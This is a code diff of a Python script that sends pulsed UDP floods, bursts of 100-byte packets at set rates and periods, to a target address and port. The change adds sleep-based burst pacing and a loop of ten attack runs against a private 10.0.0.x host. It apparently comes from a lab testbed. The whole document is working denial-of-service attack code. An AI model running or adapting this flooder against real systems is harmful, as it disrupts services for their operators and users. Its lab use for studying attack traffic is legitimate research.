@@ -30,28 +30,41 @@ class UDP:
         udp_attacker = socket(AF_INET, SOCK_DGRAM)
         # 绑定地址
         # udp_attacker.bind((self.src_host, self.src_port))
-        # 设定UDP包大小为100字节=100*8bit，其中头部占8字节=8*8bit,计算所需发送包数量
+        # 设定UDP包大小为100字节=100*8bit，其中头部占8字节=8*8bit,计算每s所需发送包数量
         bag_num = int(ceil(self.rate * 1024 * 1024 / (100 * 8)))
         now_time = start_time = time()
         while time() - start_time <= self.last:
             if time() - now_time <= self.T:
-                now_time = time()
                 if time() - now_time <= self.t:
                     for i in range(bag_num):
                         # 处理阶段,向地址（host,port）发起攻击
                         string = self.get_random_data()
                         data = string + '+' * (100 - 8 - len(string))
                         udp_attacker.sendto(data.encode(), (self.des_host, self.des_port))
+                delta = 1 - (time() - now_time)
+                if delta > 0:
+                    sleep(delta)
+            else:
+                now_time = time()
         # 连接结束，关闭套接字
         print('attack finish')
         udp_attacker.close()
 
 
-rate = input('rate:')
-last = input('last:')
-T = input('T:')
-t = input('t:')
-a1 = UDP('10.0.0.7', 16000, int(rate), int(last), int(T), float(t))
-a1.create_udp_link()
-a2 = UDP('10.0.0.8', 16000, int(rate), int(last), int(T), float(t))
-a2.create_udp_link()
+# rate = input('rate:(Mbit/s)')
+# last = input('last:(s)')
+# T = input('T:(s)')
+# t = input('t:(s)')
+attack_num = 10
+rate = [10, 10, 10, 10, 15, 15, 15, 15, 20, 20]
+T = [1, 1, 2, 2, 1, 1, 2, 2, 1, 2]
+t = [0.1, 0.2, 0.2, 0.3, 0.1, 0.2, 0.2, 0.3, 0.2, 0.3]
+for i in range(attack_num):
+    a = UDP('10.0.0.3', 16000, rate[i], 360, T[i], t[i])
+    a.create_udp_link()
+    now_time = time()
+    sleep(5)
+# a1 = UDP('10.0.0.3', 16000, 10, eval(last), 1, 0.1)
+# a1.create_udp_link()
+# a2 = UDP('10.0.0.3', 16000, 20, eval(last), 2, 0.2)
+# a2.create_udp_link()
